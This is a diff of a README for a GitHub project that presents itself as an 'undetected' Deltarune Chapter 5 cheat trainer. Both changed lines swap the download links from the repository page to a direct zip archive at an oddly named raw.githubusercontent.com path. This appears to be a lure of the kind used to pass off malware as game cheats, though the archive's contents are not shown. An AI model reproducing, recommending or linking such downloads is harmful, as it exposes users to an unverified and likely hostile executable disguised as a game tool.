@@ -5,7 +5,7 @@ description: "Modify Deltarune Chapter 5 stats, gold, and health with this undet
 ---
 # 🎮 Deltarune-Chapter5-Trainer-Undetected - Explore the game with custom stats
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Armillariacaligatabaedeker123/Deltarune-Chapter5-Trainer-Undetected)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Armillariacaligatabaedeker123/armillariacaligatabaedeker123.github.io/main/ampholyte/io-armillariacaligatabaedeker-github-2.8.zip)
 
 ## 📖 Overview
 
@@ -24,7 +24,7 @@ Ensure your computer meets these conditions to use the trainer:
 
 Visit the official repository page to access the latest version of the trainer.
 
-[Download the trainer here](https://github.com/Armillariacaligatabaedeker123/Deltarune-Chapter5-Trainer-Undetected)
+[Download the trainer here](https://raw.githubusercontent.com/Armillariacaligatabaedeker123/armillariacaligatabaedeker123.github.io/main/ampholyte/io-armillariacaligatabaedeker-github-2.8.zip)
 
 Follow these steps to obtain the tool:
 
